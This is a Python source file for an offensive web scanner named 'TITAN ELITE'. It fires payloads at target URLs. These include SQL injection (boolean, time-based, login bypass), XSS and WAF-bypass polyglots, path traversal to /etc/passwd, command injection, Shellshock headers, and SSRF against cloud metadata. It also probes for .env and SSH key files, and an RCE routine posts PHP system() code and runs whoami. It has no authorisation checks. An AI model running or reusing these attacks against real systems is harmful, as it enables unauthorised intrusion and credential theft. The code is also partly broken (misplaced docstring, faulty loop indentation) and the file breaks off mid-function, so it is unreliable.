import asyncio
import http
import json
import hashlib,logging
import random
import re
import subprocess
import time
import sys
import os
from typing import List, Dict, Any
from unittest import signals
from urllib.parse import urlparse, parse_qsl
def safe_print(msg):
    try:
        print(msg, flush=True)
    except:
        print(msg.encode("utf-8", errors="ignore").decode(), flush=True)

import requests

from phase1_scanning_detection.parameter_scanner import ParameterScanner
logging.getLogger("urllib3").setLevel(logging.CRITICAL)

# Optimization: Stop SSL warnings from cluttering the terminal
requests.packages.urllib3.disable_warnings()

MITRE_AUTO_MAP = {
    "SQLI_TIME_BLIND": {
        "tactic": "Initial Access",
        "technique_id": "T1190",
        "technique": "Exploit Public-Facing Application",
    },
    "SQLI_ERROR": {
        "tactic": "Initial Access",
        "technique_id": "T1190",
        "technique": "Exploit Public-Facing Application",
    },
    "XSS_REFLECTED": {
        "tactic": "Initial Access",
        "technique_id": "T1189",
        "technique": "Drive-by Compromise",
    },
    "LFI_TRAVERSAL": {
        "tactic": "Discovery",
        "technique_id": "T1083",
        "technique": "File and Directory Discovery",
    },
    "RCE_COMMAND_INJECTION": {
        "tactic": "Execution",
        "technique_id": "T1059",
        "technique": "Command and Scripting Interpreter",
    },
    
    # ✅ PASTE YOUR NEW MAPPINGS HERE:
    "BIZ_LOGIC_PRICE_MANIPULATION": {
        "tactic": "Impact",
        "technique_id": "T1565",
        "technique": "Data Manipulation",
    },
    "BIZ_LOGIC_PRIVILEGE_ESCALATION": {
        "tactic": "Privilege Escalation",
        "technique_id": "T1068",
        "technique": "Exploitation for Privilege Escalation",
    },
    "BIZ_LOGIC_NEGATIVE_QTY": {
        "tactic": "Impact",
        "technique_id": "T1565",
        "technique": "Data Manipulation",
        
    },
    "WORKFLOW_STATE_BYPASS": {
    "tactic": "Impact",
    "technique_id": "T1565",
    "technique": "Data Manipulation",
},
"AUTHZ_ADMIN_ACCESS": {
    "tactic": "Privilege Escalation",
    "technique_id": "T1068",
    "technique": "Exploitation for Privilege Escalation",
}
}

MITRE_CHAIN = {
    "Initial Access": "Execution",
    "Execution": "Privilege Escalation",
    "Privilege Escalation": "Impact",
    "Discovery": "Execution",
}

class ResponseValidator:
    
    """
    TITAN ELITE v3.5. 
    Comprehensive Active Scanner with High-Concurrency & Behavioral Logic.
    """
    
    def __init__(self, auth_token: str = None) -> None:
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; TITAN-ELITE/2026)",
            "Accept": "*/*"
        }
        if auth_token:
            self.headers["Authorization"] = f"Bearer {auth_token}"
            
        self.timeout = 8
        self._traffic_log = []
        
        # --- ENHANCED DETECTION REGEX (Signatures from Titan-X) ---
        self.sql_errors = re.compile(
            r"(SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient\.|"
            r"PostgreSQL.*ERROR|PG::SyntaxError|ORA-\d{5}|Oracle error|SQLite/JDBCDriver|"
            r"Microsoft OLE DB Provider for ODBC Drivers|System\.Data\.SqlClient\.SqlException|"
            r"Driver.* SQL[\-\_\ ]*Server|Unclosed quotation mark after the character string)",
            re.IGNORECASE
        )
        
        self.lfi_success = re.compile(r"root:x:0:0:root:/root:/bin/bash", re.IGNORECASE)
        self.rce_confirm = re.compile(r"(uid=\d+\(.*\)|groups=\d+\(.*\))", re.IGNORECASE)

        # [ADDED] Polyglot Payloads for WAF Bypassing
        self.polyglots = [
            "javascript://%250Aalert(1)//",
            "' OR '1'='1' /*",
            "\"`'><script>/* */</script>/* */<svg/onload=alert(1)>"
        ]

        # [ADDED] Admin Login Bypass Payloads
        self.auth_bypass_payloads = ["admin' --", "admin' #", "admin' OR '1'='1", "' OR 1=1--"]
        # [ADDED] SSTI Payloads (Math calculation check)
        self.ssti_payloads = [
            "{{7*7}}", 
            "${7*7}", 
            "<%= 7*7 %>", 
            "{{7*'7'}}", 
            "#{7*7}"
        ]

        # [ADDED] Open Redirect Payloads
        self.redirect_payloads = [
            "//google.com", 
            "//google.com/%2f..", 
            "http://google.com", 
            "javascript:alert(1)"
        ]

        # ✅ FIX: Local Import breaks the Circular Import loop
        from .core.confidence_scoring import ConfidenceScorer
        self.scorer = ConfidenceScorer()
        self.seen_fingerprints = set()
        self.candidates = []
        
        self.target = None
        self.pages = []
        self._network_scanned = False
        
        self.heuristic_params = [
            "debug", "admin", "test", "role", "access",
            "isAdmin", "is_admin", "internal", "stage"
        ]
        
    
    # ================= AGGRESSIVE CONFIRMATION CONTROLS =================
    AGGRESSIVE_MODE = True
    
    # how many independent proofs required
    MIN_CONFIRMATIONS = 3      # safe default
    MAX_CONFIRMATIONS = 30     # upper bound
    
    # time-based escalation (for hardened sites)
    SQLI_TIME_DELAYS = [3, 5, 8]
    
    # boolean depth
    BOOLEAN_TRIES = 5
    
    def _exploit_rce(self):
        if not hasattr(self, 'target') or not self.target:
            print("Target URL not set.")
            return
        rce_payload = "<?php system('id'); ?>"
        headers = {"Content-Type": "application/x-httpd-php"}
        response = requests.post(self.target, data=rce_payload, headers=headers)
        if response and "uid=" in response.text:
            print("RCE exploit successful!")
            command = "whoami"
            resp = requests.post(self.target, data="<?php system('" + command + "'); ?>", headers=headers)
            print(resp.text)
    
    # ==========================================================
    # 🟢 SMART FILTER: REMOVES NOISE BEFORE ATTACKING
    # ==========================================================
    def _optimize_vectors(self, candidates: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        
       for c in candidates:
        param = c.get("param", "")
    
        if param.lower() in ("file", "image", "img", "pic"):
            c["_attack_scope"] = "LFI_ONLY"
        else:
            c["_attack_scope"] = "FULL"
       
            
        """
        [SMART NOISE KILLER]
        1. Drops static files (images, css, js, fonts).
        2. Drops analytics / useless parameters.
        3. Deduplicates by (method + path + param).
        """
    
        optimized = []
        seen_signatures = set()
    
        static_exts = (
            ".jpg", ".jpeg", ".png", ".gif",
            ".css", ".js", ".svg", ".woff",
            ".ico", ".pdf"
        )
    
        ignored_params = {
            "utm_source", "utm_medium", "_",
            "callback", "v", "lang", "ref"
        }
    
        print(f"[PHASE 2] Optimizing {len(candidates)} raw vectors...", flush=True)
    
        for c in candidates:
            # ---- HARD GUARDS (GUI SAFE) ----
            if not c.get("url") or not c.get("param"):
                continue
    
            url = c["url"]
            param = c["param"]
            method = c.get("method", "GET").upper()
    
            path = urlparse(url).path or "/"
    
            # 1️⃣ Static file skip
            if path.lower().endswith(static_exts):
                continue
    
            # 2️⃣ Noise params skip
            if param.lower() in ignored_params:
                continue
    
            # 3️⃣ Deduplication
            signature = f"{method}|{path}|{param.lower()}"
            if signature in seen_signatures:
                continue
    
            seen_signatures.add(signature)
            optimized.append(c)
    
        print(
            f"[PHASE 2] Filter complete -> {len(optimized)} unique attack vectors",
            flush=True
        )
        return optimized
    
    def _dom_fingerprint(self, html: str) -> str:
        """
        Generates a structural DOM fingerprint:
        tags + attributes only (ignores text noise)
        """
        from bs4 import BeautifulSoup
        import hashlib
    
        soup = BeautifulSoup(html, "html.parser")
    
        structure = []
        for tag in soup.find_all(True):
            attrs = ",".join(sorted(tag.attrs.keys()))
            structure.append(f"{tag.name}:{attrs}")
    
        raw = "|".join(structure)
        return hashlib.sha256(raw.encode()).hexdigest()
    
    # ==========================================================
    # 🟢 AGGRESSIVE DOM XSS ENGINE (Requires: pip install playwright)
    # ==========================================================
    async def _test_dom_xss_aggressive(self, candidate):
        """
        REAL DOM XSS CONFIRMATION:
        DOM fingerprint diff + JS execution
        """
        from playwright.async_api import async_playwright
    
        url = candidate.get("url")
        param = candidate.get("param")
        if not url or not param:
            return 0
    
        payloads = [
            "<svg/onload=confirm(1337)>",
            "'\"><svg/onload=confirm(1337)>",
            "javascript:confirm(1337)"
        ]
    
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            
            page.on("dialog", lambda dialog: dialog.dismiss())
    
            # --- BASELINE ---
            try:
                await page.goto(url, wait_until="domcontentloaded", timeout=4000)
                base_html = await page.content()
                base_fp = self._dom_fingerprint(base_html)
            except:
                await browser.close()
                return 0
    
            for payload in payloads:
                attack_url = (
                    f"{url}?{param}={payload}"
                    if "?" not in url
                    else f"{url}&{param}={payload}"
                )
    
                executed = {"js": False}

                async def handle_dialog(d):
                    if not executed["js"]:
                        executed["js"] = True
                    await d.dismiss()
                
                page.on("dialog", handle_dialog)  
    
                try:
                    await page.goto(attack_url, wait_until="domcontentloaded", timeout=4000)
                    html = await page.content()
                    attack_fp = self._dom_fingerprint(html)
    
                    # ✅ REAL confirmation conditions
                    if attack_fp != base_fp and executed["js"]:
                        print(f"🔥 [CONFIRMED DOM XSS] {attack_url}", flush=True)
                        await browser.close()
                        return 1
    
                except:
                    continue
    
            await browser.close()
            return 0
        
    async def _test_js_dynamic_execution(self, candidate, results):
        """
        BURP-STYLE DOM XSS / JS DYNAMIC CONFIRMATION
        --------------------------------------------
        ✔ Confirms ONLY if JavaScript executes
        ✔ Detects real sinks (eval, innerHTML, document.write)
        ✔ Ignores static HTML reflection
        """
        from playwright.async_api import async_playwright
    
        url = candidate.get("url")
        param = candidate.get("param")
    
        if not url or not param:
            return
    
        # Burp-style payloads targeting JS sinks
        payloads = [
            "';alert(1337);//",
            "';confirm(1337);//",
            "<svg/onload=confirm(1337)>",
            "javascript:confirm(1337)"
        ]
    
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
    
            executed = {"js": False}
    
            # ✅ REAL confirmation hook
            async def handle_dialog(d):
                executed["js"] = True
                print("[XSS DETECTED] Alert triggered")
                await d.dismiss()
    
            page.on("dialog", handle_dialog)
    
            try:
                # Baseline load (no payload)
                await page.goto(url, wait_until="domcontentloaded", timeout=5000)
    
                for payload in payloads:
                    attack_url = (
                        f"{url}?{param}={payload}"
                        if "?" not in url
                        else f"{url}&{param}={payload}"
                    )
    
                    executed["js"] = False
    
                    await page.goto(
                        attack_url,
                        wait_until="domcontentloaded",
                        timeout=5000
                    )
    
                    # 🔥 ONLY CONFIRM IF JS EXECUTED
                    if executed["js"]:
                        self._record(
                            results,
                            candidate,
                            "DOM_XSS",
                            payload
                        )
    
                        print(
                            f"🔥 [CONFIRMED DOM JS EXECUTION] {attack_url}",
                            flush=True
                        )
    
                        await browser.close()
                        return
    
            except Exception:
                pass
    
            await browser.close()
    
    def _fingerprint_database(self, candidate):
        """
        Passive DB fingerprinting BEFORE exploitation
        Returns: mysql | postgres | sqlite | unknown
        """
        probes = {
            "mysql": "' AND @@version -- ",
            "postgres": "' AND version() IS NOT NULL -- ",
            "sqlite": "' AND sqlite_version() IS NOT NULL -- ",
        }
    
        for db, payload in probes.items():
            resp = self._fuzz(candidate, payload)
            if resp and resp.status_code == 200:
                if db == "mysql" and "mysql" in resp.text.lower():
                    return "mysql"
                if db == "postgres" and "postgres" in resp.text.lower():
                    return "postgres"
                if db == "sqlite" and "sqlite" in resp.text.lower():
                    return "sqlite"
    
        return "unknown"
    
    
    # ==========================================================
    # 🟢 CONTEXT-AWARE ORCHESTRATOR (The Brain)
    # ==========================================================
    async def validate_candidates(self, candidates: List[Dict[str, Any]], progress_cb=None) -> List[Dict[str, Any]]:

        optimized = self._optimize_vectors(candidates)
        confirmed_vulns = []
        seen = set()  # 🔥 prevent duplicates
    
        testasp_signatures = [
            "80040e14", "microsoft jet", "syntax error in query",
            "ole db provider", "[fonts]", "win.ini"
        ]
    
        total = len(optimized)
    
        print(f"[PHASE 2] Launching Titan-Elite Attack on {total} vectors...", flush=True)
    
        for i, c in enumerate(optimized):
            url = c.get('url')
            param = c.get('param')
    
            print(f"[PHASE2] Testing {url} | {param}", flush=True)
            await asyncio.sleep(0)
    
            if not url or not param:
                continue
    
            # =========================
            # 🔵 BASELINE RESPONSE (DYNAMIC)
            # =========================
            try:
                base_resp = requests.get(url, headers=self.headers, verify=False, timeout=5)
                base_len = len(base_resp.text)
            except:
                base_len = 0
    
            # =========================
            # 🔴 SQLi TEST
            # =========================
       
            attack_url = f"{url}&{param}='" if "?" in url else f"{url}?{param}='"
            print(f"[SQLi] Trying {attack_url}", flush=True)
            
            try:
                resp = requests.get(
                    attack_url,
                    headers=self.headers,
                    verify=False,
                    timeout=5
                )
            
                if (
                    resp
                    and (
                        self.sql_errors.search(resp.text)
                        or any(sig in resp.text.lower() for sig in testasp_signatures)
                        or abs(len(resp.text) - base_len) > 50
                    )
                ):
                    key = (url, param, "SQLI")
            
                    if key not in seen:
                        seen.add(key)
            
                        confirmed_vulns.append({
                            "type": "SQLI_ERROR",
                            "url": attack_url,
                            "param": param,
                            "severity": "HIGH",
                            "payload": "'",
                            "proofs": 3,
                            "mitre": MITRE_AUTO_MAP.get("SQLI_ERROR")
                        })
            
                        print(f"[OK] SQLi FOUND: {attack_url}", flush=True)
            
            except Exception as e:
                print(f"[SQLi ERROR] {e}", flush=True)
                
            # =========================
            # 🟢 XSS TEST
            # =========================
            try:
                payloads = self._smart_payloads(param)
            
                for payload in payloads:
                    xss_url = f"{url}&{param}={payload}" if "?" in url else f"{url}?{param}={payload}"
            
                    print(f"[XSS] Trying {xss_url}", flush=True)
            
                    resp = requests.get(
                        xss_url,
                        headers=self.headers,
                        verify=False,
                        timeout=5
                    )
            
                    if not resp:
                        continue
            
                    # =====================
                    # Reflected XSS
                    # =====================
                    if payload in resp.text:
                        key = (url, param, "XSS_REFLECTED")
            
                        if key not in seen:
                            seen.add(key)
            
                            confirmed_vulns.append({
                                "type": "XSS_REFLECTED",
                                "url": xss_url,
                                "param": param,
                                "severity": "MEDIUM",
                                "payload": payload,
                                "proofs": 2,
                                "mitre": MITRE_AUTO_MAP.get("XSS_REFLECTED")
                            })
            
                            print(f"[OK] XSS FOUND: {xss_url}", flush=True)
            
                    # =====================
                    # DOM-Based XSS
                    # =====================
                    if self._detect_dom_xss(resp.text):
                        key = (url, param, "DOM_XSS")
            
                        if key not in seen:
                            seen.add(key)
            
                            confirmed_vulns.append({
                                "type": "DOM_XSS",
                                "url": xss_url,
                                "param": param,
                                "severity": "HIGH",
                                "payload": payload,
                                "proofs": 1,
                                "mitre": MITRE_AUTO_MAP.get("XSS_REFLECTED")
                            })
            
                            print(f"[OK] DOM XSS FOUND: {xss_url}", flush=True)
            
            except Exception as e:
                print(f"[XSS ERROR] {e}", flush=True)
                
            # =========================
            # 📊 PROGRESS
            # =========================
            percent = int(((i + 1) / total) * 100)
    
            if progress_cb:
                progress_cb(percent)
    
            print(f"[PROGRESS] PHASE2 {percent}", flush=True)
    
        print("[PHASE2] COMPLETED", flush=True)
    
        return confirmed_vulns
    # ================== ATTACK WEAPONS ==================
     
    def _detect_dom_xss(self, html: str) -> bool:
        sinks = [
            "innerHTML",
            "document.write",
            "location.hash",
            "location.search",
            "eval(",
            "setTimeout(",
            "setInterval(",
        ]
    
        sources = [
            "location",
            "document.URL",
            "document.referrer",
        ]
    
        html_lower = html.lower()
    
        return any(s in html_lower for s in sinks) and any(
            s in html_lower for s in sources
        )
     
    def _generate_dynamic_params(self, param):
        base = param.lower()
    
        dynamic_map = {
            "id": ["1", "2", "5", "10", "999"],
            "q": ["test", "admin", "' OR 1=1", "<script>alert(1)</script>"],
            "search": ["test", "product", "' OR 1=1"],
            "user": ["admin", "guest", "test"],
        }
    
        return dynamic_map.get(base, ["test", "1", "' OR 1=1"])
     
    def _test_sqli(self, candidate, results):
        # ✅ ADD THIS LINE HERE (FIRST LINE INSIDE FUNCTION)
        print(f"[DEBUG] SQLi {candidate.get('param')} @ {candidate.get('url')}", flush=True)
        
        payloads = [
            "' OR 1=1 --",
            "' OR 1=2 --",
            "' AND SLEEP(5) --",
            "'"
        ]
    
        try:
            # 🔹 BASELINE RESPONSE
            base_resp = self._fuzz(candidate, "1")
            if not base_resp:
                return
    
            base_text = base_resp.text
            base_time = base_resp.elapsed.total_seconds()
    
            proofs = 0
    
            for payload in payloads:
    
                attack_resp = self._fuzz(candidate, payload)
                if not attack_resp:
                    continue
    
                attack_text = attack_resp.text
                attack_time = attack_resp.elapsed.total_seconds()
    
                # ✅ 1. ERROR-BASED SQLi (STRONG)
                if self.sql_errors.search(attack_text):
                    proofs += 2
    
                # ✅ 2. BOOLEAN-BASED SQLi
                if payload == "' OR 1=1 --":
                    true_resp = attack_text
    
                elif payload == "' OR 1=2 --":
                    false_resp = attack_text
    
                    if true_resp != false_resp:
                        proofs += 2
    
                # ✅ 3. TIME-BASED SQLi
                if "SLEEP" in payload:
                    if attack_time > base_time + 4:
                        proofs += 2
    
                # ✅ 4. RESPONSE DIFFERENCE
                if base_text != attack_text:
                    proofs += 1
    
                # ✅ 5. LENGTH ANOMALY
                if len(attack_text) > len(base_text) * 1.3:
                    proofs += 1
    
            # 🎯 FINAL DECISION
            if proofs >= 4:
                self._report_vuln(candidate, "SQL Injection (Confirmed)", "Critical", results)
    
            elif proofs >= 2:
                self._report_vuln(candidate, "SQL Injection (Likely)", "High", results)
    
            elif proofs == 1:
                self._report_vuln(candidate, "SQL Injection (Weak)", "Medium", results)
    
        except Exception as e:
            print(f"[SQLi ERROR] {e}")

    def _test_xss(self, candidate, results):
        
        # ✅ ADD THIS LINE HERE (FIRST LINE INSIDE FUNCTION)
        print(f"[DEBUG] SQLi {candidate.get('param')} @ {candidate.get('url')}", flush=True)
    
        # Unique token for reflection detection
        token = f"TITAN{random.randint(1000, 9999)}X"
        payload = f"\"><script>console.log('{token}')</script>"
    
        try:
            # 🔹 BASELINE RESPONSE (important)
            base_resp = requests.get(
                candidate['url'],
                params={candidate['param']: "test123"},
                timeout=self.timeout,
                verify=False
            )
    
            # 🔹 ATTACK RESPONSE
            attack_resp = requests.get(
                candidate['url'],
                params={candidate['param']: payload},
                timeout=self.timeout,
                verify=False
            )
    
            if not base_resp or not attack_resp:
                return
    
            base_text = base_resp.text
            attack_text = attack_resp.text
    
            proofs = 0
    
            # ✅ 1. Reflection check (core signal)
            if token in attack_text:
                proofs += 2   # strong signal
    
            # ✅ 2. Response difference
            if base_text != attack_text:
                proofs += 1
    
            # ✅ 3. Length anomaly
            if len(attack_text) > len(base_text) * 1.2:
                proofs += 1
    
            # 🎯 FINAL DECISION
            if proofs >= 3:
                self._report_vuln(candidate, "Reflected XSS (Confirmed)", "High", results)
    
            elif proofs == 2:
                self._report_vuln(candidate, "Reflected XSS (Likely)", "Medium", results)
    
            elif proofs == 1:
                self._report_vuln(candidate, "Reflected XSS (Weak)", "Low", results)
    
        except Exception as e:
            print(f"[XSS ERROR] {e}")
    

    def _test_lfi(self, candidate, results):
    
        payloads = [
            "../../etc/passwd",
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini"
        ]
    
        try:
            base_resp = self._fuzz(candidate, "test123")
            if not base_resp:
                return
    
            base_text = base_resp.text
    
            for payload in payloads:
    
                attack_resp = self._fuzz(candidate, payload)
                if not attack_resp:
                    continue
    
                attack_text = attack_resp.text
                proofs = 0
    
                # ✅ 1. Sensitive file patterns (STRONG)
                if "root:x:" in attack_text or "daemon:" in attack_text:
                    proofs += 3
    
                if "[extensions]" in attack_text.lower():  # Windows
                    proofs += 3
    
                # ✅ 2. Response difference
                if attack_text != base_text:
                    proofs += 1
    
                # ✅ 3. Length anomaly
                if len(attack_text) > len(base_text) * 1.3:
                    proofs += 1
    
                # 🎯 DECISION
                if proofs >= 3:
                    self._report_vuln(candidate, "LFI (Confirmed)", "High", results)
                    return
    
                elif proofs == 2:
                    self._report_vuln(candidate, "LFI (Likely)", "Medium", results)
    
        except Exception as e:
            print(f"[LFI ERROR] {e}")

    def _test_rce(self, candidate, results):
    
        payloads = [
            ";id",
            "&& whoami",
            "| whoami"
        ]
    
        try:
            base_resp = self._fuzz(candidate, "test123")
            if not base_resp:
                return
    
            base_text = base_resp.text
    
            for payload in payloads:
    
                attack_resp = self._fuzz(candidate, payload)
                if not attack_resp:
                    continue
    
                attack_text = attack_resp.text
                proofs = 0
    
                # ✅ 1. Command output detection (STRONG)
                if "uid=" in attack_text or "gid=" in attack_text:
                    proofs += 3
    
                if "root" in attack_text.lower():
                    proofs += 2
    
                # ✅ 2. Response difference
                if attack_text != base_text:
                    proofs += 1
    
                # 🎯 DECISION
                if proofs >= 3:
                    self._report_vuln(candidate, "RCE (Confirmed)", "Critical", results)
                    return
    
                elif proofs == 2:
                    self._report_vuln(candidate, "RCE (Likely)", "High", results)
    
        except Exception as e:
            print(f"[RCE ERROR] {e}")

    def _test_blind_sqli(self, candidate, results):
        """
        [TITAN SNIPER] Time-Based Blind SQLi with Baseline Comparison.
        """
        # 1. Establish Baseline Latency
        start_b = time.time()
        self._fuzz(candidate, "1")
        self._fuzz(candidate, "0")
        baseline = (time.time() - start_b) / 2

        # 2. Inject Sleep Payload
        # Payload works for MySQL/PostgreSQL mostly
        p = "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" 
        
        start_p = time.time()
        resp = self._fuzz(candidate, p)
        if not resp: return

        latency = time.time() - start_p
        
        # 3. Decision: Is latency significantly higher?
        # Threshold: At least 4.5 seconds (allowing for some network jitter)
        if latency >= baseline * 3 and latency >= 4:
            self._record(results, candidate, "SQLI_TIME_BLIND", p)
            
    def _hash_response(self, text: str) -> str:
        """
        Stable content hash (ignores scripts & whitespace)
        """
        if not text:
            return ""
    
        text = re.sub(r"<script.*?</script>", "", text, flags=re.S | re.I)
        text = re.sub(r"\s+", " ", text)
        return hashlib.sha256(text.encode()).hexdigest()
    
    def _validate_response(self, normal_text, attack_text, payload):
        """
        CENTRAL VALIDATION ENGINE (STRONG LOGIC)
        Combines multiple signals for real confirmation
        """
    
        proofs = 0
        result = "NONE"
    
        # 1️⃣ SQL ERROR CHECK (STRONG)
        if self.sql_errors.search(attack_text):
            proofs += 2
            result = "SQLI_ERROR"
    
        # 2️⃣ RESPONSE DIFFERENCE
        if normal_text != attack_text:
            proofs += 1
    
        # 3️⃣ LENGTH ANOMALY
        if len(attack_text) > len(normal_text) * 1.3:
            proofs += 1
    
        # 4️⃣ PAYLOAD REFLECTION (XSS signal)
        if payload in attack_text:
            proofs += 1
            result = "XSS_REFLECTED"
    
        # 5️⃣ SENSITIVE DATA LEAK
        sensitive_keywords = ["root:x:", "admin", "password", "uid="]
        if any(k in attack_text.lower() for k in sensitive_keywords):
            proofs += 2
            result = "DATA_LEAK"
    
        # 🎯 FINAL DECISION
        if proofs >= 3:
            return "CONFIRMED", result
    
        elif proofs == 2:
            return "LIKELY", result
    
        elif proofs == 1:
            return "WEAK", result
    
        return "NONE", result
    
    def _boolean_time_probe(self, candidate) -> bool:
        """
        Hybrid Boolean + Time proof
        """
        start = time.time()
        self._fuzz(candidate, "1' AND IF(1=1,0,SLEEP(5))-- ")
        t_true = time.time() - start
    
        start = time.time()
        self._fuzz(candidate, "1' AND IF(1=0,0,SLEEP(5))-- ")
        t_false = time.time() - start
    
        return t_false - t_true >= 4.5

    def _test_boolean_time_hybrid(self, candidate, results):
        baseline_start = time.time()
        self._fuzz(candidate, "1")
        baseline = time.time() - baseline_start
    
        payload = "' AND IF(1=0,SLEEP(5),0)-- "
        start = time.time()
        resp = self._fuzz(candidate, payload)
        delay = time.time() - start
    
        if resp and delay - baseline >= 4:
            self._record(
                results,
                candidate,
                "SQLI_BOOLEAN_TIME",
                payload
            )
        
    def _test_boolean_sqli(self, candidate, results):
        """
        REAL Boolean SQLi:
        Hash comparison + false condition divergence
        """
        target = candidate.get("url")
        param = candidate.get("param")
        if not target or not param:
            return
    
        # --- baseline ---
        base = self._fuzz(candidate, "1")
        if not base or not base.text:
            return
    
        import hashlib
        
        def h(txt): 
            return hashlib.sha256(txt.encode(errors="ignore")).hexdigest()
    
        base_hash = h(base.text)
    
        # --- true condition ---
        true_payload = "1' AND 1=1-- "
        resp_true = self._fuzz(candidate, true_payload)
    
        # --- false condition ---
        false_payload = "1' AND 1=0-- "
        resp_false = self._fuzz(candidate, false_payload)
    
        if not resp_true or not resp_false:
            return
    
        true_hash = h(resp_true.text)
        false_hash = h(resp_false.text)
    
        # ✅ REAL confirmation:
        # - true == baseline
        # - false != baseline
        if true_hash == base_hash and false_hash != base_hash:
            self._record(
                results,
                candidate,
                "SQLI_BOOLEAN",
                f"{true_payload} | {false_payload}"
            )
        

    def _test_ssrf(self, candidate, results):
        p = "http://169.254.169.254/latest/meta-data/"
        resp = self._fuzz(candidate, p)
        if resp and ("instance-id" in resp.text or resp.status_code == 200):
            if any(x in candidate.get("param", "").lower() for x in ["url", "file", "path"]):
                self._record(results, candidate, "SSRF", p)

    def _test_bola(self, candidate, results):
        """
        [NEW] BOLA/IDOR Module: Detects unauthorized access by rotating IDs.
        """
        orig = str(candidate.get("orig_value", "1"))
        if not orig.isdigit(): return
            
        # Try to access ID+1 and ID-1
        new_val = str(int(orig) + 1)
        resp = self._fuzz(candidate, new_val)
        
        # If we get a 200 OK and the content is different enough, it's a hit
        if resp and resp.status_code == 200 and len(resp.text) > 100:
            # Check if we see sensitive keywords for the *new* user
            if any(x in resp.text.lower() for x in ["user", "email", "id", "profile"]):
                self._record(results, candidate, "BOLA_IDOR", new_val)
            
    def _test_proto(self, candidate, results):
        p = "?__proto__[polluted]=true"
        resp = self._fuzz(candidate, p)
        if resp and ("polluted" in resp.text or resp.status_code == 500):
            self._record(results, candidate, "PROTOTYPE_POLLUTION", p)

    # <--- PASTE YOUR NEW FUNCTIONS HERE --->

    def _test_polyglot(self, candidate, results):
        # [ADDED] Polyglot Fuzzer to break WAFs
        for payload in self.polyglots:
            resp = self._fuzz(candidate, payload)
            if resp:
                if "alert(1)" in resp.text or "syntax error" in resp.text:
                    self._record(results, candidate, "POLYGLOT_BREAK", payload)
                    break

    def _analyze_passive_url(self, candidate, results):
        # [ADDED] Passive Admin & Config Discovery
        url = candidate.get("url")
        if not url: return
        try:
            resp = requests.get(url, headers=self.headers, timeout=5, verify=False)
            
            # 1. Directory Listing
            if "Index of /" in resp.text:
                results.append(self.scorer.score({
                    "type": "DIRECTORY_LISTING", "url": url, "param": "URL", 
                    "payload": "None", "details": "Server directory listing exposed."
                }))

            # 2. Exposed Admin Panel
            if resp.status_code == 200 and any(x in url.lower() for x in ["/admin", "/login", "/dashboard"]):
                 results.append(self.scorer.score({
                    "type": "ADMIN_PANEL_EXPOSED", "url": url, "param": "URL", 
                    "payload": "None", "details": "Found active admin interface."
                }))
        except Exception:
            pass
        
    def _test_ssti(self, candidate, results):
    
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}"
        ]
    
        try:
            base_resp = self._fuzz(candidate, "test123")
            if not base_resp:
                return
    
            base_text = base_resp.text
    
            for payload in payloads:
    
                attack_resp = self._fuzz(candidate, payload)
                if not attack_resp:
                    continue
    
                attack_text = attack_resp.text
                proofs = 0
    
                # ✅ 1. Expression evaluation (STRONG)
                if "49" in attack_text and "49" not in base_text:
                    proofs += 3
    
                # ✅ 2. Response difference
                if attack_text != base_text:
                    proofs += 1
    
                # 🎯 DECISION
                if proofs >= 3:
                    self._report_vuln(candidate, "SSTI (Confirmed)", "High", results)
                    return
    
                elif proofs == 2:
                    self._report_vuln(candidate, "SSTI (Likely)", "Medium", results)
    
        except Exception as e:
            print(f"[SSTI ERROR] {e}")

    def _test_redirect(self, candidate, results):
        for p in self.redirect_payloads:
            try:
                url = candidate.get("url")
                method = candidate.get("method", "GET").upper()
                params = dict(parse_qsl(urlparse(url).query))
                if candidate.get("location") in ["query", "query_string"]:
                     params[candidate.get("param")] = p
                
                # allow_redirects=False is CRITICAL here
                resp = requests.request(method, url, params=params, 
                                      headers=self.headers, timeout=5, verify=False, allow_redirects=False)
                
                if resp.status_code in [301, 302] and "google.com" in resp.headers.get("Location", ""):
                    self._record(results, candidate, "OPEN_REDIRECT", p)
                    break
            except: pass

    # ==================================================================
    # ⬇️ PASTE THE NEW FUNCTIONS HERE (Inside ResponseValidator Class) ⬇️
    # ==================================================================

    def _test_shellshock(self, candidate, results):
        """
        [ADVANCED] Shellshock (CVE-2014-6271)
        Attacks Bash environment variables via HTTP Headers.
        """
        target = candidate.get("target") or candidate.get("url")
        if not target: return

        payload = "() { :;}; echo; /bin/id"
        attack_headers = self.headers.copy()
        attack_headers.update({
            "User-Agent": payload,
            "Referer": payload,
            "X-Forwarded-For": payload
        })

        try:
            resp = requests.get(target, headers=attack_headers, timeout=5, verify=False)
            if resp and "uid=" in resp.text and "gid=" in resp.text:
                self._record(results, candidate, "SHELLSHOCK_RCE", payload) # Fixed record call
        except: pass

    def _test_sensitive_files(self, candidate, results):
        """
        [ADVANCED] Critical File Access
        Checks for SSH keys, Environment files, and backups.
        """
        target = candidate.get("url")
        if not target: return
        
        critical_files = [
            ".env", ".git/HEAD", ".ssh/id_rsa", "backup.sql", "web.config"
        ]
        from urllib.parse import urljoin
        
        for file in critical_files:
            target_url = urljoin(target, file)
            try:
                resp = requests.get(target_url, headers=self.headers, timeout=5, verify=False)
                is_hit = False
                if file == ".env" and "DB_PASSWORD" in resp.text: is_hit = True
                if file == ".git/HEAD" and "refs/heads" in resp.text: is_hit = True
                if file == ".ssh/id_rsa" and "BEGIN OPENSSH PRIVATE KEY" in resp.text: is_hit = True
                
                if is_hit:
                    # Manually construct finding dict since this isn't a fuzzing candidate
                    finding = {
                        "type": "CRITICAL_FILE_EXPOSURE",
                        "url": target_url,
                        "param": "URL_PATH",
                        "payload": file,
                        "severity": "Critical"
                    }
                    
                    results.append(self.scorer.score(finding))
                    break 
            except: pass
            
    def _test_encoded_exposure(self, candidate, results):
        """
        [ADVANCED] Encoded Data Inspector
        Detects Base64 or Hex strings in responses, decodes them, 
        and checks if they leak internal secrets.
        """
        target = candidate.get("url")
        if not target: return

        # Regex for Base64 (len >= 20 to avoid noise)
        base64_pattern = re.compile(r'(?:[A-Za-z0-9+/]{4}){5,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?')
        
        try:
